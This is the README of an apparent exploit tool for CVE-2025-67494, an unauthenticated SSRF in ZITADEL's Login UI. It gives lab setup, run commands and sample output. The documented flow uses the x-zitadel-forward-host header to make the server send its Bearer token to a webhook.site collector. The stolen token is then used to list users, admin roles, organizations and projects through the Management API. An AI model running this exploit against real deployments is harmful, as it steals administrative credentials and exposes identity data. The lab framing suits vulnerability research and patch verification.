# ZITADEL SSRF Exploit - CVE-2025-67494

Automated exploit for CVE-2025-67494 that performs SSRF exploitation and automatically retrieves the leaked Bearer token to query the ZITADEL Management API.

## Vulnerability

- **CVE**: CVE-2025-67494
- **CVSS**: 9.3 (Critical)
- **Type**: Unauthenticated Full-Read SSRF
- **Affected Versions**: ZITADEL v4.0.0-rc.1 through 4.7.0
- **Fixed Version**: >= 4.7.1

## Description

ZITADEL Login UI (V2) was vulnerable to service URL manipulation via the `x-zitadel-forward-host` header. The URL resolution logic treated this header as a trusted fallback, allowing an unauthenticated attacker to force the server to make HTTP requests to arbitrary domains, including internal addresses.

**Critical Impact**: The vulnerability also leaks Bearer authentication tokens in SSRF requests.

## Setup

### Start the Lab

```bash
docker compose up -d
```

Wait a few seconds for ZITADEL to fully start.

### Services

- **ZITADEL API** (port 28080): ZITADEL 4.7.0 (vulnerable version < 4.7.1)
- **ZITADEL Login UI** (port 29000): Login interface V2

## Installation

### Using uv (Recommended)

```bash
uv sync
```

This will create a virtual environment and install all dependencies.

### Using pip

```bash
pip install requests pwntools
```

## Usage

### Basic Usage

```bash
uv run python exploit.py -u http://localhost:29000
```

Or with pip:

```bash
python3 exploit.py -u http://localhost:29000
```

### With API URL

```bash
uv run python exploit.py -u http://localhost:29000 -a http://localhost:28080
```

### Options

- `-u, --ui-url`: ZITADEL Login UI URL (required)
- `-a, --api-url`: ZITADEL Management API URL (optional, auto-detected if not provided)
- `--timeout`: Timeout in seconds for webhook polling (default: 60)

## Example Output

```bash
$ uv run python exploit.py -u http://localhost:29000

[*] Starting CVE-2025-67494 exploit
[*] UI URL: http://localhost:29000, API URL: http://localhost:28080
[*] Creating webhook.site URL via API...
[+] Webhook created: https://webhook.site/c7c8ef1b-4b00-410f-90af-79fe3eb6c821
[*] OOB host: c7c8ef1b-4b00-410f-90af-79fe3eb6c821.webhook.site
[*] Sending SSRF request...
[*] Exploiting SSRF to http://localhost:29000
[*] OOB host: c7c8ef1b-4b00-410f-90af-79fe3eb6c821.webhook.site
[+] SSRF request sent (status: 200)
[*] Polling webhook for Bearer token (timeout: 30s)...
[*] Webhook received 1 request(s)...
[+] Bearer token successfully retrieved!
[*] Token: XeA8UY8C8Jc6kWcx509KXJhfUP6CQ2N6uXvUoruOwbtV9YzNKp...
[*] Retrieving information via Management API...
[*] 
    ============================================================
[*] IAM Information
[*] ============================================================
[*] Global Org ID: 350420171829100547
    IAM Project ID: 350420171829166083
    Default Org ID: 350420171829100547
[*] 
    ============================================================
[*] Organization Information
[*] ============================================================
[*] ID: 350420171829100547
    Name: ZITADEL
    State: ORG_STATE_ACTIVE
    Primary Domain: zitadel.localhost
[*] 
    ============================================================
[*] Users
[*] ============================================================
[*] Machine: login-client - USER_STATE_ACTIVE
    Human: zitadel-admin@zitadel.localhost (zitadel-admin@zitadel.localhost) - USER_STATE_ACTIVE
[*] 
    ============================================================
[*] User Memberships (User ID: 350420171829690371)
[*] ============================================================
[*] IAM: ZITADEL - Roles: IAM_LOGIN_CLIENT
[*] 
    ============================================================
[*] Projects
[*] ============================================================
[*] ZITADEL (ID: 350420171829166083) - PROJECT_STATE_ACTIVE
[*] 
    ============================================================
[*] Organization Members
[*] ============================================================
[*] zitadel-admin@zitadel.localhost - Roles: ORG_OWNER
[*] 
    ============================================================
[*] Organization Domains
[*] ============================================================
[*] zitadel.localhost - Verified Primary
[+] Exploitation completed successfully!
```

## How It Works

1. **Webhook Creation**: Automatically creates a webhook.site URL via API for OOB interaction
2. **SSRF Exploitation**: Sends a GET request to `/ui/v2/login` with the `x-zitadel-forward-host` header
3. **Token Extraction**: Polls webhook.site to retrieve the leaked Bearer token from the SSRF request
4. **API Enumeration**: Uses the token to query various Management API endpoints:
   - IAM information
   - Organization details
   - Users list
   - User memberships and roles
   - Projects
   - Organization members
   - Organization domains

## Output

The exploit will display:

- Bearer token (truncated)
- IAM information (global org ID, IAM project ID, default org ID)
- Organization information
- Users list with details
- User memberships and roles (ORG_OWNER, IAM_OWNER, etc.)
- Projects list
- Organization members
- Organization domains

## Requirements

- Python 3.8+
- `uv` (recommended) or `pip`
- Dependencies: `requests`, `pwntools`

## Notes

- The exploit uses webhook.site for OOB interaction (no local server needed)
- The API URL is auto-detected from the UI URL if not provided (assumes port 28080)
- The exploit automatically handles webhook creation, token extraction, and API queries

